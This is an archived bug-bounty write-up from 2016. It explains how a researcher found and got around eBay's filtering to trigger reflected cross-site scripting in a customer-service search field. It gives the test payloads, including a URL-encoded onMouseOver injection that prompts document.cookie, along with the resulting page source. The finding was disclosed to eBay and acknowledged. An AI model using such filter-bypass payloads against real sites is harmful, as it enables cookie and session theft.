---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2016-11-18_bypassing-ebay-xss-protection-to-launch-xss-by-nirmal-dahal.md
original_filename: 2016-11-18_bypassing-ebay-xss-protection-to-launch-xss-by-nirmal-dahal.md
title: Bypassing Ebay XSS Protection to launch XSS by Nirmal Dahal
category: documents
detected_topics:
- xss
- command-injection
tags:
- imported
- documents
- xss
- command-injection
language: en
raw_sha256: 3c7d96cee2d872f472b4fcef5429194bbd2147540552f4e26755a3d8c99130dd
text_sha256: babbcad852058b4bdd3a7fb4aca34bf240c7a1a2b44551de3a4fd7fd3262bc03
ingested_at: '2026-06-28T07:31:55Z'
sensitivity: unknown
redactions_applied: false
---

# Bypassing Ebay XSS Protection to launch XSS by Nirmal Dahal

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2016-11-18_bypassing-ebay-xss-protection-to-launch-xss-by-nirmal-dahal.md
- Source Type: markdown
- Detected Topics: xss, command-injection
- Ingested At: 2026-06-28T07:31:55Z
- Redactions Applied: False
- Raw SHA256: `3c7d96cee2d872f472b4fcef5429194bbd2147540552f4e26755a3d8c99130dd`
- Text SHA256: `babbcad852058b4bdd3a7fb4aca34bf240c7a1a2b44551de3a4fd7fd3262bc03`


## Content

---
title: "Bypassing Ebay XSS Protection to launch XSS by Nirmal Dahal"
page_title: "ByPassing eBay XSS Protection. Hi, there today I want to share small… | by Nirmal Dahal - #Nittam | PenTester Nepal | Medium"
url: "https://medium.com/pentesternepal/bypassing-ebay-xss-protection-8cf73466ba0f"
authors: ["Nirmal Dahal (@TheNittam)"]
programs: ["Ebay"]
bugs: ["Reflected XSS"]
publication_date: "2016-11-18"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 6242
scraped_via: "browseros"
---

# Bypassing Ebay XSS Protection to launch XSS by Nirmal Dahal

ByPassing eBay XSS Protection
Nirmal Dahal - #Nittam
Follow
3 min read
·
Mar 7, 2021

291

3

Press enter or click to view image in full size

H
i, there today I want to share small proof of concept regarding “Reflective Cross-Site Scripting [ R-XSS ]” which I had found on eBay back in 2016. I am not an active participant in bug bounty programs, but one day I had finished all my office works so I was surfing on Facebook and received a message from my brother, Samir, asking for advice regarding some musical instruments. The message contained an eBay link. Once on eBay, I logged into the site to view details and suddenly noticed the “Help & Contact” menu, I followed that menu and went to the “Customer Service” page where I saw a search field, I decided to check for “Cross-Site Scripting [ XSS ]” vulnerability and unexpectedly found POST type R-XSS.

Testing For XSS

As all security researchers do, I also have certain pathways to find vulnerabilities. I always use’>Test12345<“ as it contains a number, letter, and syntax. This allows me to see how a website handles user inputs. Some questions like “is the user input sanitized? how sensitive is user input?” can be answered from this idea.

Finding XSS

Once I noticed the “Customer service” page with a search field, I used that specific text in the field. I noticed that the value was being reflected without [ >< “ ]. I immediately figured out that eBay must have been replacing those syntaxes in White Space. The output in View-Source was like below:

<input type=”text” id=”query“ role=”combobox” name=”query” value=”‘ Test12345 ” title=”Search by help topic, keywords, or phrases” aria-expanded=”false” aria-autocomplete=”list” aria-activedescendant=”” aria-value=”‘ Test12345 ” autocomplete=”off” aria-owns=”popup” class=”dText3“></input>

To test and understand the application further, I used this payload “/><script>alert(1);</script><input type=”

however, the syntax was still filtered by eBay. So I encoded it in URL ENCODE format:

%22%2f%3E%3Cscript%3Ealert%281%29%3B%3C%2fscript%3E%3Cinput%20type%3D%22

Get Nirmal Dahal - #Nittam’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

After that the page source for that specific part was as follow:

<input type=”text” id=”query“ role=”combobox” name=”query” value=”” script alert 1 script input type=”” title=”Search by help topic, keywords, or phrases” aria-expanded=”false” aria-autocomplete=”list” aria-activedescendant=”” aria-value=”” script alert 1 script input type=”” autocomplete=”off” aria-owns=”popup” class=”dText3“></input>

By seeing this, I realized that eBay was also filtering URL encoded syntax except for %22 & %3D which decoded value is “ and =

After these research were made, I tweaked my payload a little to: %22 onMouseOver=%22prompt(document.cookie) which decodes to “ onMouseOver=“prompt(document.cookie)

Finally, after this, the XSS attack was successful and all was good to go.

<input type=”text” id=”query“ role=”combobox” name=”query” value=” ” onMouseOver=”prompt(document.cookie)” title=”Search by help topic, keywords, or phrases” aria-expanded=”false” aria-autocomplete=”list” aria-activedescendant=”” aria-value=” ” onMouseOver=”prompt(document.cookie)” autocomplete=”off” aria-owns=”popup” class=”dText3“></input>

Almost all eBay domains were vulnerable at that time including eBay.in, eBay.com.au etc

Press enter or click to view image in full size
Reply From eBay Security Team
Press enter or click to view image in full size
Acknowledgment By eBay
Video POC

Thank you all for reading this write-up. Please feel free to ask if you have any confusion about this article and if I had made any mistake please leave a comment 🙂 or message me on Twitter.
